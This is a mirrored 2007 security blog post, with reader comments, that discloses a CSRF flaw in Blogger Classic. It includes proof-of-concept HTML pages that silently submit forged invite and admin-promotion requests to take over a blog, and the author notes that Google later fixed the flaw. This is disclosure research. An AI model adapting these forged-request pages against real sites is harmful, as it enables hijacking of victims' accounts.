@@ -1,0 +1,301 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/csrf-ing-blogger-classic/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:21:35 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; CSRF-ing Blogger Classic</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; CSRF-ing Blogger Classic Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Google Search Results Poisoning' href='../google-search-results-poisoning/index.html' />
+<link rel='next' title='Atom Database' href='../atom-2/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../indexb4d2.html?p=139' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-139" class="post">
+	<div class="post-title"><h2><span>CSRF-ing Blogger Classic</span></h2></div>
+	<div class="post-date"><span>published:</span> January 19th, 2007</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>In <a href="http://www.blogger.com/">Blogger</a> Classic, admin users who originally created a blog can be removed by other admin users. This behavior allows for a complete and non-reversible hijack of a Blogger Classic blog through  CSRF/XSRF/session riding/one-click attacks.</p>
+
+<p>The process is a two shots attacks, meaning that the victim admin user needs to click on two different links while being authenticated. Due to the nature of blogging, in which admins go through the comments posted by visitors, this attack is very feasible. This is probably even more true for blogs that are moderated, since blog admins review posts carefully including URLs embedded in posts before publishing the posts, thus clicking on the evil link <strong>while authenticated</strong>.</p>
+
+<p>What each evil URL does:</p>
+
+<ol>
+<li>Send an invitation link to the attacker on behalf of the admin user in order to become a blog member (only permission to create new posts is given to the attacker at this point)</li>
+<li>Change the attacker&#8217;s permissions from guest to admin.</li>
+</ol>
+
+<p>After this, the attacker can login to the target blog as an admin user and remove the original admin user who created the blog (remember that in &#8220;Blogger Classic&#8221; admins users can remove the original admin user of the blog). The only rule is that there must exist <strong>at least one admin user</strong>. At this point, the victim admin user can never take control over the  blog even though he/she was the original founder.</p>
+
+<p><em>blogger-classic-attack-step-1.html</em></p>
+
+<pre><code>&lt;HTML&gt;&lt;BODY&gt;
+&lt;H1&gt;You are being CSRFed in the background while viewing this HTML page&lt;/H1&gt;
+&lt;iframe src=&quot;./blogger-classic-add-user.html&quot; height=&quot;0&quot; width=&quot;0&quot; frameborder=&quot;0&quot;&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;</code></pre>
+
+<p><em>blogger-classic-add-user.html</em></p>
+
+<pre><code>&lt;HTML&gt;&lt;BODY&gt;
+&lt;!--
+Blogger Classic "invite new team member" request
+POST http://www.blogger.com/send-invite.do
+
+blogID=12345678&amp;email0=attacker@domain.com&amp;email1=&amp;email2=&amp;inviteMessage=
+
+Note: 'blogID' can be found by visitors on the main page of a blog within several URLs in the source code of the page. Change 'email0' with attacker's email.
+--&gt;
+&lt;form method=&quot;POST&quot; id=&quot;evil&quot; name=&quot;evil&quot; action=&quot;http://www.blogger.com/send-invite.do&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;blogID&quot; value=&quot;12345678&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email0&quot; value=&quot;attacker@domain.com&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email1&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email2&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;inviteMessage&quot; value=&quot;&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.evil.submit()&lt;/script&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;</code></pre>
+
+<p><em>blogger-classic-attack-step-2.html</em></p>
+
+<pre><code>&lt;html&gt;&lt;body&gt;
+&lt;!--
+This request is a GET, and makes an existing guest member (the attacker in this case) an admin.
+
+i.e.:
+
+http://www.blogger.com/team-member-modify.do?blogID=12345678&#038;memberID=55555555&#038;isAdmin=1
+
+Note: assign to 'memberID' the value of the 'userID' of the attacker. 'userID' can be found after logging into Blogger Classic (rather than "New Blogger") using the attacker's Blogger Classic account and accessing "edit profile"  (variable in HTML form named 'userID').
+This value is also available in the address bar's URL after acessing "view profile" (i.e.: http://www.blogger.com/profile/55555555) .
+'blogID' is the same value as the one used in the first HTML attack page ("blogger-classic-add-user.html").
+--&gt;
+&lt;script&gt;
+var_blogID=12345678; // change to ID of target Blogger Classic blog
+var_memberID=55555555; // change to attacker&apos;s member ID
+
+new Image().src=&quot;http://www.blogger.com/team-member-modify.do?blogID=&quot;+var_blogID+&quot;&amp;memberID=&quot;+var_memberID+&quot;&amp;isAdmin=1&quot;;
+&lt;/script&gt;
+&lt;H1&gt;You are being CSRFed in the background while viewing this HTML page&lt;/H2&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+<p>After visiting a URL that contains the second HTML file, the attacker can now login to the target blog as an admin user and remove the original owner of the blog, thus completely hijacking the blog. The attack could be even more automated, but the attack walkthrough discussed here is enough to take over a &#8220;Classic Blogger&#8221; blog.</p>
+
+<p>The first attack HTML file <em>attack-step-1.html</em> calls <em>blogger-classic-add-user.html</em> through an iframe so that the forged POST request is sent <strong>in the background</strong> while the victim admin user is viewing the HTML page. The second second attack HTML file <em>blogger-classic-attack-step-1.html</em> uses an image object that sends the forged GET request <strong>in the background</strong> without needing to use an iframe.</p>
+
+<p>By the way, in &#8220;New Blogger&#8221; there are also some interesting requests that are not being tokenized. Similar to Blogger Classic, changing profile details does require a token (i.e.: &#8216;securityToken&#8217; parameter), while inviting a new user, for instance, does not. I.e.:</p>
+
+<pre><code>POST http://www2.blogger.com/add-authors.do
+blogID=1234567890123456789&amp;authorsList=attacker%40domain.com+&amp;submit=true</code></pre>
+
+<p>Note: I suspect that it is possible to tell when a blog is &#8220;Classic Blogger&#8221; or &#8220;New Blogger&#8221; by looking up the &#8216;blogID&#8217; value from the source code of the main blog page and checking if the numeric value is 8 digits long, rather than 19 digits long which is used by &#8220;New Blogger&#8221;</p>
+
+<p>Solution: admin users are recommended to switch to new blogger, and to use a different web browser to visit links while logged on to Blogger.</p>
+
+<p><em>Greetings to pdp, David Kierznowski , Amir Azam (thanks for testing the attack). This CSRF experiment is dedicated to my babe peluchita!!!</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pagvac/index.html" title="Posts by pagvac" rel="author">pagvac</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/blogger/index.html" rel="tag">blogger</a> | <a href="../../tags/google/index.html" rel="tag">google</a> | <a href="../../tags/javascript/index.html" rel="tag">javascript</a> | <a href="../../tags/xss/index.html" rel="tag">xss</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-2659">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://ikwt.com/' rel='external nofollow' class='url'>pagvac</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-2659">
+			January 23, 2007 at 12:39 am</a>		</div>
+
+		<p>The reason for adding a comment to the post is that today January 22 2007, I examined the &#8220;add new user&#8221; request of both, Blogger Classic and New Blogger and I was impressed that Google had added tokens for both versions of Blogger.</p>
+<p>At first, when I informed Google and forwarded the research, they simply replied with automated emails, finally pointing me to a Blogger help URL.</p>
+<p>So I thought they didn&#8217;t care much about CSRF issues. However, I must admit that I&#8217;m very impressed with them since they fixed the problem very fast.</p>
+<p>It&#8217;d be nice to get additional ideas from some of you guys if possible.</p>
+<p>Here is an example of the fixed &#8220;add new user&#8221; requests for both versions of Blogger (notice &#8216;securityToken&#8217;):</p>
+<pre><code>POST /add-authors.do HTTP/1.1
+Host: www2.blogger.com
+
+blogID=12345678&amp;securityToken=fmA1trWgTvwf6XZIlyn9WI_n0Nc%3D%3A1169507915539&amp;authorsList=%3Cattacker%40domain.com%3E%2C+&amp;submit=true</code></pre>
+<pre><code>POST /add-authors.do HTTP/1.1
+Host: www&#46;blogger.com
+
+blogID=12345678&amp;securityToken=fmA1trWgTvwf6XZIlyn9WI_n0Nc%3D%3A1169507915539&amp;authorsList=%3Cattacker%40domain.com%3E%2C+&amp;submit=true</code></pre>
+<p>P.S.: I forgot to say thank you to Jeremiah Grossman who kindly gave me feedback on this research.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-71621">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/2f584c695e05111afe17b1a7b1ede964?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">mana</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-71621">
+			November 15, 2007 at 11:57 pm</a>		</div>
+
+		<p>interesting write up, is there a fix for this attack?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor even thread-even depth-1" id="comment-72479">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-72479">
+			November 18, 2007 at 5:30 am</a>		</div>
+
+		<p>Hello mana,</p>
+<p>As mentioned in my previous comment on this page, Google fixed the issue back on January 22 2007.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-128179">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/57be658429f419863610a6bb7cac5bd6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Andrea</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128179">
+			February 26, 2010 at 5:01 am</a>		</div>
+
+		<p>But mine is template problem.When I was currently changing my template,when I click the &#8216;Preview&#8217; button,then all I saw is the same error!Can you tell me what happen?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-133622">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6932fd8236cec12354ba8230c0e80d81?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Skeptic_fx</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-133622">
+			June 9, 2011 at 6:10 pm</a>		</div>
+
+		<p>So did you enter the Google Security Hall of Fame? Guess you were way too early :P</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-133623">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6932fd8236cec12354ba8230c0e80d81?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Skeptic_fx</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-133623">
+			June 9, 2011 at 6:11 pm</a>		</div>
+
+		<p>Also there are some parts of google which still has some kind of CSRfs</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="139"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="508db91bda" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/csrf-ing-blogger-classic/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:21:35 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
